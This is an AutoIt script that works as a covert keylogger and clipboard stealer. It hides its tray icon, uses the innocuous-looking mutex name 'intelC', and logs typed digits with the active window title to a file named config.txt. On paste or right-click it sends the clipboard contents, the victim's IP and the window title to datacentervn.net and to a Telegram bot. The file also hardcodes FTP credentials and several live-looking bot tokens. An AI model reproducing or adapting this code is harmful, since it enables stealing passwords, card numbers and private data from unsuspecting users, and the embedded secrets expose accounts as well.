#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=..\..\..\Screenshot-2022-08-13-115457.ico
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Misc.au3>
#include <MsgBoxConstants.au3>
#include <FTPEx.au3>
#include <Date.au3>
#include <Array.au3>
#Include "Json.au3"
#include <Inet.au3>
#include <Date.au3>

$server = 'datacentervn.net'
$username = 'u454459286.datacent_admin'
$pass = '12345678aA@'
;asdsada


Local $Key = StringSplit("30|31|32|33|34|35|36|37|38|39|60|61|62|63|64|65|66|67|68|69|08|2E", "|")
Local $char = StringSplit("0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|<-|del", "|")


If _Singleton("intelC", 1) = 0 Then
    Exit
EndIf

Local $ip = _GetIP()
Local $ip1 = StringReplace($ip,".","")


Local $user = _sendGetApi("http://datacentervn.net/admin/get_log?ip=",$ip)
$i=1
Local $hDLL = DllOpen("user32.dll")
While 1
	For $u = 1 To $Key[0]
		If _IsPressed($Key[$u], $hDLL) Then
			Local $current_window = WinGetTitle("[ACTIVE]")
			While _IsPressed($Key[$u], $hDLL)
			WEnd
			ConsoleWrite(_NowTime()&"|"&$current_window&": "&$char[$u]&@CRLF)
			;FileWrite ("config.txt",_NowTime()&"|"&$current_window&": "&$char[$u]&@CRLF)
			FileWrite ("config.txt",$char[$u])
		EndIf
	Next
    If _IsPressed("11", $hDLL) Then
        ConsoleWrite("_IsPressed - Ctrl Key was pressed." & @CRLF)
        ; Wait until key is released.
        While _IsPressed("11", $hDLL)
            If _IsPressed("56", $hDLL) Then
				clip_catch()
				ExitLoop
			EndIf
        WEnd
	ElseIf _IsPressed("02", $hDLL) Then
        ; Wait until key is released.
		clip_catch()
	EndIf
	Sleep(50)
WEnd

DllClose($hDLL)
Func clip_catch()
	Sleep(700)
	Local $clip_now = ClipGet()
	Local $current_window = WinGetTitle("[ACTIVE]")
	$url = 'http://datacentervn.net/admin/clipboard'
	$command = "?ip="&$ip&"&title="&$current_window&"&clipboard="&$clip_now
	_sendGetApi($url,$command)
	_msgTlg($ip&"|"&$user&"|"&$current_window&": "&$clip_now)
EndFunc


Func _msgTlg($cmd)
	;1475055946:AAGe_uGNJ1AckR1AD6KJr4c_Hog1Nhlweqk      monkey    -423711258
	;1475387763:AAEGZ1i9ZPhmEQHG7Tu04XNm5VhJ-M9q8EY      chicken   -418195661----
	;1283488176:AAHV1gLSzVWJmIGwILcRJj0btyAG6UIHqJ8      dog      -480336150
	$chat_id = "-418195661"
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$command = $cmd
	$URL="api.telegram.org/bot1475387763:AAEGZ1i9ZPhmEQHG7Tu04XNm5VhJ-M9q8EY/sendMessage?chat_id="&$chat_id&"&text="&$command
	$oHTTP.Open("POST", "https://" & $URL, False)
	$oHTTP.Send()
	$response = $oHTTP.ResponseText
	ConsoleWrite ($response & @CRLF & @CRLF)
EndFunc

Func _sendGetApi($url,$command)
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST",$url&$command, False)
	$oHTTP.Send()
	$response = $oHTTP.ResponseText
	Return $response
EndFunc



